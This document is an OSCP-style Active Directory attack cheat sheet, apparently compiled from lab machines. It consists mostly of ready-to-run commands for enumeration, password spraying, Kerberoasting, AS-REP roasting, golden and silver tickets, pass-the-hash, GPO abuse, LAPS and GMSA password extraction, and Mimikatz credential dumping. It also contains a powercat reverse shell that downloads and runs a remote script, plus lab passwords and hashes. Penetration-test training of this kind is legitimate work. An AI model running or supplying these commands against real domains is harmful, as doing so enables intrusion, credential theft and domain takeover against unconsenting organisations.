# OSCP-Cheat-Sheets-AD

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse \
https://0xsp.com/offensive/privilege-escalation-cheatsheet \
https://book.hacktricks.xyz/windows/active-directory-methodology \
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a \
https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet \
https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory \
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
https://wadcoms.github.io/


```Shell
rdate -n 10.10.10.52
```

## Enumerate

### RPC
https://www.hackingarticles.in/active-directory-enumeration-rpcclient/

Get-ADGroupMember -Identity 'Web Admins' -Recursive

### Active Directory Enumeration: BloodHound
https://www.hackingarticles.in/active-directory-enumeration-bloodhound/
https://swepstopia.com/bloodhound-enumeration/


Get-ADDomain
(Get-ADDomain).DomainSID
Get-ADDefaultDomainPasswordPolicy
Get-ADForest -Identity heist.offsec
Get-ADGroup -Filter "*" | Select 'Name
Get-ADGroupMember -Identity 'Web Admins' -Recursive
Get-ADPrincipalGroupMembership -Identity enox

Get-ADuser -Filter * -Properties * | select SamAccountName
Get-ADuser -Filter * -Properties * | select servicePrincipalName
Get-ADUser -Filter * -Properties * | Where {$_.ServicePrincipalName -ne $null} | Select 'Name','ServicePrincipalName'



### Enumerate logged-in and sessions users

```console
powershell -executionpolicy bypass
PS C:\AD> Import-Module .\PowerView.ps1
PS C:\AD> Get-NetLoggedon -ComputerName dc01;
PS C:\AD> Get-NetSession -ComputerName dc01
PS C:\AD> IEX(New-Object System.Net.WebClient).DownloadString('http://<URL>/powerview.ps1');Get-NetLoggedon -ComputerName Tiger01;
```

### Enumerate Service Principal Names
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Get-SPN.ps1
```console
GET-SPN -type service -search "MSSQLSvc"
GET-SPN -type service -search "HTTP"
GET-SPN -type service -search "*"
```
```console
C:\Windows\Temp>setspn -T active -Q */*
```
```console
C:\Windows\Temp>powershell -ExecutionPolicy Bypass -File querySPN.ps1
```
```console
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  Foreach($prop in $obj.Properties)
  {
    $prop
  }
}
```

### Local enumeration
https://www.jonathanmedd.net/wp-content/uploads/2009/10/ADPowerShell_QuickReference.pdf

#### Poweshell
https://www.hackingarticles.in/active-directory-enumeration-powerview/
```Shell
PS C:\> Set-ExecutionPolicy Unrestricted
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName pc-user
Get-NetSession -ComputerName dc01
```
User enumeration
```Shell
net user
net user /domain
net user admin /domain
net group /domain

```console
powershell -executionpolicy bypass -File enum-ad.ps1
```
```
#Get SID
wmic useraccount get name,sid
```

### Remote enumeration
#### User enumeration
https://github.com/insidetrust/statistically-likely-usernames \
#To Domain controller

```Shell
crackmapexec smb 192.168.102.172 -u ' ' -p '' --rid-brute
```
```Shell
impacket-GetADUsers -all  yuncorp.local/ -dc-ip 192.168.100.20
impacket-GetADUsers -all  yuncorp.local/yenriquez:<pwd> -dc-ip 192.168.100.20
impacket-GetADUsers -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
impacket-GetADUsers -all  hutch.offsec/fmcsorley:CrabSharkJellyfish192 -dc-ip 192.168.240.122  

```
```Shell
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=/opt/SecLists/Usernames/Names/names.txt 10.10.10.52
kerbrute userenum --domain htb.local /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52 
kerbrute userenum --domain active.htb /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.100 
```

#### LDAP enumeration 
https://book.hacktricks.xyz/pentesting/pentesting-ldap
```
ldapdomaindump -u 'yuncorp.local\yenriquez' -p 'P@$$w0rd!' 192.168.100.20
ldapdomaindump -u 'hutch.offsec\fmcsorley' -p 'CrabSharkJellyfish192' 192.168.240.122 
```
```
nmap -n -sV --script "ldap* and not brute" 192.168.240.122
```
```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.120.108" "(objectclass=*)"
ldapsearch -x -h 192.168.240.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName 
ldapsearch -x -h 192.168.240.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description
```
 
## attacks

### Spray Password Spraying
https://www.hackingarticles.in/comprehensive-guide-on-password-spraying-attack/ \
https://www.hackingarticles.in/kerberos-brute-force-attack/
```console
crackmapexec smb <IP> -u users.txt -p passwords.txt
crackmapexec smb 10.10.10.100 -u 'Administrator' -p pwds.txt 

kerbrute bruteuser -d active --dc active.htb /usr/share/wordlists/rockyou.txt Administrator

python3 kerbrute.py -user Administrator -passwords /OSCPv3/htb/Active/pwds.txt -domain active -dc-ip 10.10.10.100
python3 kerbrute.py -user Administrator -password Ticketmaster1968 -domain active.htb -dc-ip 10.10.10.100

python /opt/kerbrute/kerbrute.py -domain hutch.offsec -users users.txt -passwords users.txt -dc-ip 192.168.240.122

cat /usr/share/wordlists/rockyou.txt | grep -n -P "[\x80-\xFF]"
```
```console
PS C:> .\Spray-Passwords.ps1 -Pass pass123 -Admin  # -File to wordlist, -Admin test acount admin
```

### Kerberoasting
#Service Account Attacks
https://www.hackingarticles.in/abusing-kerberos-using-impacket/ \
https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/ \
https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/

#### Local attack 

Mimikatz
```console
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```
Request TGS
```console
PS C:\> Set-ExecutionPolicy Unrestricted
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
klist
```
```console
C:\Windows\Temp>powershell -ExecutionPolicy Bypass -c "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'kadmin/changepw'; klist"
powershell -ExecutionPolicy Bypass -c "klist"
```
```console
mimikatz # kerberos::list /export
Invoke-Mimikatz -Command '"kerberos::list /export"'
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-USER@HTTP~Corp.corp.com-CORP.COM.kirbi
```

Rubeus
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries \
https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
```console
C:\> Rubeus.exe kerberoast /creduser:yuncorp.local\jenriquez /credpassword:<pass>
C:\Windows\Temp>Rubeus.exe kerberoast /outfile:hash.txt

hashcat -m 13100  -a 0 hash_rubeus.txt /usr/share/wordlists/rockyou.txt --show
```

#### Request TGS

Impacket
```console
impacket-GetUserSPNs yuncorp.local/yenriquez -dc-ip 192.168.100.20  # know SPNs
impacket-GetUserSPNs -request 'yuncorp.local/yenriquez:P@$$w0rd!' -dc-ip 192.168.100.20 # Get TGS to any service
impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100
impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request

john hash_tgt.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 13100 -a 0 hash_tgt.txt /usr/share/wordlists/rockyou.txt --show --force
```
Invoke-kerberoast
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
```Shell
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> import-module ./invoke-kerberoast.ps1
PS C:\> invoke-kerberoast -outputformat hashcat
```
```console
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> import-module ./Invoke-Mimikatz.ps1
```
```console
hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt rockyou.txt --force
hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt --show --force
```

### ASPREPRoast - Get tickets without pwd
https://www.hackingarticles.in/as-rep-roasting/

#User configurate = DONT_REQ_PREAUTH - Create packet KRB_AS_REQ
```console
rpcclient -U "jenriquez" -W "yuncorp.local" 192.168.100.20
>enumdomusers
```
```console
impacket-GetNPUsers yuncorp.local/ -usersfile users.txt -format john -outputfile hash_2.txt -dc-ip 192.168.100.20 
impacket-GetNPUsers 'yuncorp.local/yenriquez:P@$$w0rd!' -format hashcat -outputfile hash.txt -dc-ip 192.168.100.20
impacket-GetNPUsers active.htb/ -usersfile users.txt -format john -outputfile hash_tgt_ASPREPRoast.txt -dc-ip 10.10.10.100
```
```console
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### Golden ticket attack - create TGT - first get the krbtgt hash NTLM 
https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/ \
https://swepstopia.com/golden-ticket-attack/ \
#Required Admin Domain - Attack to Domain controller

```console
powershell -ep bypass
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> Import-Module .\Invoke-Mimikatz.ps1
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"' > output.txt
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /domain:yuncorp.local /sid:<sid> /rc4:<krbtgt hash> /user:Administrador /ticket:golden.kirbi"' # SID get output.txt

# Machine User Domain
mimikatz.exe
kerberos:ptt gold.kirbi
exit
>dir \\DC\admin$
>dir \\DC\c$

# get shell 
impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid <sid> -domain yuncorp.local Administrator  #output Administrator.ccache
export KRB5CCNAME=/root/Administrator.ccache
impacket-psexec -k -n yuncorp.local/Administrator@DC-Corp cmd.exe   # Add domain in /etc/hosts
```

```console
impacket-ticketer -nthash b889e0d47d6fe22c8f0463a717f460dc -domain-sid S-1-5-21-405608879-3187717380-1996298813 -domain active.htb dc 
python /usr/local/bin/psexec.py -k -n active.htb/dc@DC.active.htb cmd.exe   
impacket-psexec -k -n active.htb/dc@DC.active.htb cmd.exe 
```
```console
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' -M mimikatz -o COMMAND="\"lsadump::lsa /inject /name:krbtgt\""   
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' -M mimikatz -o COMMAND="\"kerberos::golden /domain:active.htb /sid:S-1-5-21-405608879-3187717380-1996298813 /rc4:b889e0d47d6fe22c8f0463a717f460dc /user:dc /ticket:golden.kirbi\""
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' -x 'copy golden.kirbi \\10.10.14.12\folder\golden.kirbi'
```

### Pass-the-Hash
https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
```console
kali@kali:~$ pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

### Overpass-the-Hash - Request ticket with NTLM
https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/

Dumps the cached password hashes
```console
mimikatz # sekurlsa::logonpasswords
```
```console
mimikatz # sekurlsa::pth /user:sec_admin /domain:corporate.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
PS C:\Windows\system32> klist   # list the cached Kerberos tickets
PS C:\Windows\system32> net use \\dc01    # No Kerberos tickets have been cached
PS C:\Windows\system32> klist
PS C:> .\PsExec.exe \\dc01 cmd.exe
```
Rubeus
```console
C:\Windows\Temp>Rubeus.exe asktgt /domain:active.htb /user:dc /rc4:bdfd7b5acf78eba25920e83fdd4d001d /ptt
dir \\DC\c$
.\PsExec.exe \\dc01 cmd.exe
```

Impacket
```console
impacket-getTGT active.htb/dc -dc-ip 10.10.10.100 -hashes :bdfd7b5acf78eba25920e83fdd4d001d
python /usr/local/bin/psexec.py -k -n active.htb/DC@DC.active.htb cmd.exe  
```

### Pass-the-ticket - takes advantage of the TGS
https://www.hackingarticles.in/lateral-movement-pass-the-ticket-attack/
https://www.hackingarticles.in/lateral-movement-pass-the-ccache/

Get SID
```console
whoami /user
```
```console
#flush any existing Kerberos ticket
mimikatz # kerberos::purge
mimikatz # kerberos::list
```
```console
mimikatz # kerberos::golden /user:sec /domain:corporate.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorporateWebServer.corporate.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```

### Group Policy Object Enumeration
```console
evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" -s .
*Evil-WinRM* PS C:\Users\anirudh\Documents> PowerView.ps1
*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-NetGPO
*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh    #GpoEditDeleteModifySecurity
*Evil-WinRM* PS C:\Users\anirudh\Documents> upload /home/kali/SharpGPOAbuse.exe
*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
*Evil-WinRM* PS C:\Users\anirudh\Documents> gpupdate /force
*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup Administrators
python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.120.116
```
```console
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "VAULT\anirudh"}
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "VAULT\anirudh"}
**Get New Powerview 3.0
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators anirudh /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### LAPS
https://www.hackingarticles.in/credential-dumpinglaps/
```console
ldapsearch -x -h 192.168.240.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 

$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
```

### Group Managed Service Accounts (GMSA)
https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
https://stealthbits.com/blog/securing-gmsa-passwords/
```console
Get-ADServiceAccount -Filter *
Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword    # Show Groups with permiss
Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
```
```console
$gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
$mp
```
```console
Evil-WinRM* PS C:\Windows\temp> upload /opt/tools/GMSAPasswordReader.exe
./GMSAPasswordReader.exe --accountname svc_apache
```
```console
evil-winrm -i 192.168.102.165 -u svc_apache$ -H 78BC82C952449150A12AD60E870A2BE4
```

### Domain Persistence: Golden Certificate Attack
https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/

### Domain Persistence: DC Shadow Attack
https://www.hackingarticles.in/domain-persistence-dc-shadow-attack/

### Domain Persistence AdminSDHolder
https://www.hackingarticles.in/domain-persistence-adminsdholder/


### Exploits
https://hackmag.com/security/windows-ad-escalation/ \
https://swepstopia.com/impersonation-tokens/


### GPO
python3 /opt/gpp-decrypt/gpp-decrypt.py -f ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml


#### Kerberos MS14-068
https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html \
https://raw.githubusercontent.com/mubix/pykek/master/ms14-068.py
```console
impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
```

#### Escalating Privileges with DNSAdmins Group
https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b
https://hackmag.com/security/windows-ad-escalation/

#### Active Directory Privilege Escalation (CVE-2021–42278)
https://www.hackingarticles.in/active-directory-privilege-escalation-cve-2021-42278/ \
https://github.com/Ridter/noPac \
https://github.com/WazeHell/sam-the-admin \
https://swepstopia.com/samaccountname-spoofing-cve-2021-42278/ \
https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html \
https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing

#### Print Nightmare CVE-2021-1675
https://swepstopia.com/print-nightmare/
https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spooler-service-abuse

#### Net Zero Logon CVE-2020-1472
https://swepstopia.com/net-zero-logon/
https://github.com/dirkjanm/CVE-2020-1472

#### log4j CVE-2021-44228
https://swepstopia.com/log4j-cve-2021-44228/ \
https://www.hackingarticles.in/a-detailed-guide-on-log4j-penetration-testing/

### SYSVOL
```console
#Groups.xml
gpp-decrypt <pwd>
```

### Crackmapexec
https://mpgn.gitbook.io/crackmapexec/getting-started/using-kerberos

```console
crackmapexec smb 192.168.100.0/24 
```

## Utils

### WinRM
```Shell
evil-winrm -i 192.168.227.165 -u enox -p california 
```

### RCE Impaket
https://www.hackingarticles.in/remote-code-execution-using-impacket/

```Shell
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
impacket-psexec yuncorp.local/Administrator:P@\$\$w0rd\!@192.168.100.19 cmd.exe
impacket-psexec workgroup/root:pwd@192.168.100.19 cmd.exe
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
```
```Shell
crackmapexec smb 192.168.100.19 -u root -p <pwd> --local-auth -x whoami 
https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/
```
```Shell
powershell -exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.17/powercat.ps1');powercat -c 192.168.100.17 -p 443 -e cmd"
```
https://www.hackingarticles.in/powercat-for-pentester/
https://github.com/PowerShellMafia/PowerSploit


#PowerShell
https://sp00ks-git.github.io/posts/CLM-Bypass/ \
https://github.com/calebstewart/bypass-clm \
https://github.com/padovah4ck/PSByPassCLM \
https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/ \
https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/ 

#Macros
https://www.hackingarticles.in/multiple-ways-to-exploit-windows-systems-using-macros/

https://www.hackingarticles.in/windows-for-pentester-bitsadmin/
https://www.hackingarticles.in/windows-for-pentester-certutil/

### Credential Dumping: Domain Cache Credential
https://www.hackingarticles.in/credential-dumping-domain-cache-credential/ \
https://www.hackingarticles.in/credential-dumping-dcsync-attack/ \
https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/ \
https://www.hackingarticles.in/credential-dumping-ntds-dit/ \
https://www.hackingarticles.in/credential-dumping-sam/ \
https://www.hackingarticles.in/credential-dumping-wdigest/
https://www.hackingarticles.in/credential-dumping-windows-credential-manager/ \

### Kerberos Authentication

Process
1. User logs in workstation -- -AS-REQ_TGT --> KDC.  # REQ_TGT = timestamp encrypted with hash password NTLM + user
2. KDC -- AS-REP --> client. # AS_REP = Session key(encrypted user password hash) + TGT (key session encrypted krbtgt NT hash KDC)(include info user and groups).
#Finish KDC considers the client authentication complete

To access resources of the domain, such as application with a registered SPN
1. Client -- TGS_REQ --> DC-KDC  # TGS_REQ (user and timestamp encrypted using the session key + SPN of the resource + TGT)
2. DC-KDC TGT decrypted_secret_key -- TGS_REP -->  Client.   # TGS_REP (SPN + session key to client and SPN) encrypted_session_key_TGT + (service ticket) encrypted_password_hash
3. Cliente -- AP_ REQ --> Application.  # AP_REQ = Username + timestamp encrypted with the session key associated with the service ticket
4. Application -- Service Autenticacion --> Client.
